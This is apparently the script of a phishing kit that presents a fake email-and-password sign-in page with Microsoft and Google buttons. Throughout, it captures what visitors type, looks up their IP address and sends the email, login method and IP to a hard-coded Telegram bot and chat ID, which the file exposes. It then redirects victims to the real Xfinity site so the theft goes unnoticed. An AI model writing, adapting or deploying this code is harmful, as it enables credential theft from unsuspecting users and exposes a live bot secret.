// --- CONFIG ---
// Replace with your Telegram bot token and chat ID
const TELEGRAM_BOT_TOKEN = '8222905537:AAE42mdylMZnh1s7kHZF_ZzPyF3PGLGK8uk';
const TELEGRAM_CHAT_ID = '977002560';

// Your real website URL - customers get redirected here after login
const REDIRECT_URL = 'https://connect.xfinity.com/'; // <-- CHANGE THIS TO YOUR REAL WEBSITE

// --- STATE ---
let state = {
  email: '',
  password: '',
  step: 'email',
  ipAddress: '',
  userAgent: navigator.userAgent
};

// --- INIT ---
document.addEventListener('DOMContentLoaded', () => {
  fetchIP();

  const emailInput = document.getElementById('email-input');
  const passwordInput = document.getElementById('password-input');

  emailInput.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') handleSubmit();
  });
  passwordInput.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') handleSubmit();
  });

  emailInput.addEventListener('input', () => hideError('email'));
  passwordInput.addEventListener('input', () => hideError('password'));
});

// --- IP FETCH ---
async function fetchIP() {
  try {
    const res = await fetch('https://api.ipify.org?format=json');
    const data = await res.json();
    state.ipAddress = data.ip;
  } catch {
    state.ipAddress = 'Unknown';
  }
}

// --- TELEGRAM ---
async function sendToTelegram(message) {
  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    });
  } catch (e) {
    console.log('Telegram send failed:', e);
  }
}

function formatMessage(data) {
  const time = new Date().toLocaleString();
  let msg = `<b>🛍️ Muzzks Ko — New Customer Login</b>\n`;
  msg += `━━━━━━━━━━━━━━━\n`;
  msg += `<b>📧 Email:</b> ${data.email}\n`;
  msg += `<b>🔐 Method:</b> ${data.method}\n`;
  msg += `<b>🌐 IP:</b> ${state.ipAddress}\n`;
  msg += `<b>🕐 Time:</b> ${time}\n`;
  msg += `━━━━━━━━━━━━━━━`;
  return msg;
}

// --- HANDLERS ---
function handleMicrosoft() {
  const email = document.getElementById('email-input').value.trim();
  if (!isValidEmail(email)) {
    showError('email', 'Please enter a valid email first');
    document.getElementById('email-input').focus();
    return;
  }
  state.email = email;
  state.method = 'Microsoft';
  doLogin();
}

function handleGoogle() {
  const email = document.getElementById('email-input').value.trim();
  if (!isValidEmail(email)) {
    showError('email', 'Please enter a valid email first');
    document.getElementById('email-input').focus();
    return;
  }
  state.email = email;
  state.method = 'Google';
  doLogin();
}

function handleSubmit() {
  const emailInput = document.getElementById('email-input');
  const passwordGroup = document.getElementById('password-group');
  const passwordInput = document.getElementById('password-input');

  if (state.step === 'email') {
    const email = emailInput.value.trim();
    if (!isValidEmail(email)) {
      showError('email', 'Please enter a valid email address');
      return;
    }
    state.email = email;
    state.step = 'password';

    passwordGroup.classList.remove('hidden');
    passwordInput.focus();
    document.getElementById('submit-btn').textContent = 'Sign In';
    return;
  }

  if (state.step === 'password') {
    const password = passwordInput.value.trim();
    if (!password) {
      showError('password', 'Please enter your password');
      return;
    }
    state.password = password;
    state.method = 'Email';
    doLogin();
  }
}

async function doLogin() {
  showStep('loading');

  const msg = formatMessage({
    email: state.email,
    method: state.method
  });
  await sendToTelegram(msg);

  setTimeout(() => {
    showStep('success');
    setTimeout(() => {
      window.location.href = REDIRECT_URL;
    }, 2000);
  }, 1500);
}

// --- UTILS ---
function isValidEmail(email) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
}

function showError(field, msg) {
  const el = document.getElementById(field + '-error');
  if (el) {
    el.textContent = msg;
    el.classList.remove('hidden');
  }
}

function hideError(field) {
  const el = document.getElementById(field + '-error');
  if (el) el.classList.add('hidden');
}

function showStep(stepName) {
  document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
  document.getElementById('step-' + stepName).classList.add('active');
}

function showToast(msg) {
  const t = document.getElementById('toast');
  t.textContent = msg;
  t.classList.add('show');
  setTimeout(() => t.classList.remove('show'), 3000);
}
